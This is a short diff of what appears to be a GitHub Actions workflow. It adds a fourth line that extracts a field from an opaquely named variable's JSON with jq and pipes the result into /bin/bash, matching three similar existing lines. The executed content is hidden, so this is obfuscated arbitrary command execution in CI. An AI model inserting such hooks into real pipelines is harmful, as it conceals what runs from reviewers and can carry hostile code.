@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$bz3" | jq -r .apeck9 | /bin/bash
           printf '%s' "$iim1496" | jq -r .xw332 | /bin/bash
           echo $u698 | jq -r .s969 | /bin/bash
+          echo $nb1 | jq -r .n8 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
